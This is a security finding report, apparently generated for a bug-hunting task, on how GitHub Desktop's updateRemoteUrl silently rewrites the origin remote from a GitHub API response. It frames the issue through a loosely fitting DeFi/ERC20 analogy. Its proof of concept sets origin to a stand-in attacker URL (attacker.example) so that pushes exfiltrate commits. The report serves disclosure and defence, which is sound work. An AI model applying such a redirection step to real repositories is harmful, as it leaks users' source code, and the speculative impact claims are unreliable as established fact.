## Title
Silent, unconfirmed rewrite of the `origin` remote URL from an attacker-influenced GitHub API response - ([File: app/src/lib/stores/updates/update-remote-url.ts])

## Summary
The DeFi report's broken invariant is that an untrusted party is silently granted control over a critical value (the ERC20 `allowance`) and that value is then used to redirect asset flow without the victim noticing, with `sync()` used to make the corrupted state "stick." The nearest reachable Desktop analog is `updateRemoteUrl`, which silently rewrites a repository's `origin` remote URL based on the `clone_url` field of a `GitHubRepository`/`IAPIRepository` object fetched from the GitHub API, with no user confirmation dialog, whenever a same-protocol, previously-unmodified remote is detected as "stale."

## Finding Description
`updateRemoteUrl` is invoked with an `apiRepo` object obtained from `API.fetchRepository(owner, name)` [1](#0-0)  during the periodic "refresh GitHub repository" flow (`repositoryWithRefreshedGitHubRepository`), which runs automatically in the background, not just on explicit user action.

Inside `updateRemoteUrl`, the function compares the current `origin` remote URL against the previously known `gitHubRepository.cloneURL` and the new `apiRepo.clone_url`: [2](#0-1) 

If the git protocol (`https`/`ssh`) of old and new URLs match, and the current remote still matches the previously-stored `cloneURL` (i.e., the user hasn't manually customized it), and the new URL differs from the current one, the code calls `gitStore.setRemoteURL(...)` and rewrites `origin` to the new URL — with **no prompt, confirmation, or diff shown to the user**. This logic exists to transparently follow legitimate repository renames/transfers on GitHub, but it applies the same trust to any `clone_url` value returned by the API endpoint associated with the account, including GitHub Enterprise Server (GHES) endpoints that are not `github.com`. Unlike `parseRemote`/`urlsMatch`, which validate the *shape* of a Git remote URL, nothing here validates that the new host is the same host, or asks the user to approve a redirection to a wholly different repository/server.

This mirrors the on-chain bug class: a value that should require explicit re-approval (the destination of future `git fetch`/`git push` traffic) is silently mutated based on an externally-supplied object (the API response), and once mutated it persists ("sticks") exactly like the corrupted `sync()`'d reserve in the ERC20 pair.

## Impact Explanation
If an attacker can influence the API response for `repos/{owner}/{name}` — e.g., by controlling or MITM'ing a compromised/self-signed GHES endpoint, a malicious/rogue proxy configured for that account, or a compromised network path to a non-github.com API host that the app has been pointed to — the app will silently repoint `origin` to an attacker-chosen URL of the same protocol. Subsequent user-initiated `git push`/`git fetch` operations in the Desktop UI will silently target the attacker's server instead of the real one, exfiltrating the user's commits (source code, potentially secrets) to the attacker and/or serving the user attacker-controlled refs/objects on fetch. This falls squarely under "silent corruption of what the user commits or pushes," one of the explicitly valid impact categories.

## Likelihood Explanation
Likelihood is constrained: the attacker must control the API response backing `IAPIFullRepository`/`IAPIRepository` for that endpoint (not github.com's own TLS-protected API, which is out of scope for local-code analysis), typically relevant for GHES or a network-position attacker against a misconfigured/self-signed endpoint. It does not require any user click beyond having previously added/used the repository — the refresh path runs automatically. No local or physical access, no malware, and no credential leak is required; the only precondition is influence over the "git remote/proxy response" for that repository's API metadata, which is one of the explicitly accepted attacker capabilities in this task's scope.

## Recommendation
Before silently rewriting `origin`, `updateRemoteUrl` should: (1) verify the hostname of the new `clone_url` matches the hostname of the account's configured endpoint/existing remote, rejecting or requiring explicit confirmation for cross-host changes; and (2) surface a confirmation dialog (similar to the existing `UpstreamAlreadyExists` dialog pattern) whenever the destination host or owner/name changes, rather than auto-applying the change silently.

## Proof of Concept
1. Add a repository in Desktop backed by a GitHub Enterprise Server (or any non-github.com) account whose API responses can be influenced by the attacker (self-signed/misconfigured TLS, compromised network proxy, or compromised GHES instance).
2. Let Desktop's automatic background refresh call `repositoryWithRefreshedGitHubRepository` → `api.fetchRepository(owner, name)` [1](#0-0) .
3. Return an `IAPIFullRepository` object whose `clone_url` is `https://attacker.example/owner/evil.git` (same `https` protocol as the original remote).
4. `updateRemoteUrl` sees `protocolsMatch === true`, `remoteUrlUnchanged === true` (user never touched origin), and `urlsMatch === false`, so it silently calls `gitStore.setRemoteURL('origin', 'https://attacker.example/owner/evil.git')` [3](#0-2)  — with no dialog shown to the user, unlike the existing `UpstreamAlreadyExists` warning used for the analogous upstream-remote case [4](#0-3) .
5. The user's next "Push"/"Fetch" in the Desktop UI now silently targets `attacker.example`, exfiltrating commits/pushes to the attacker-controlled remote.

```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```
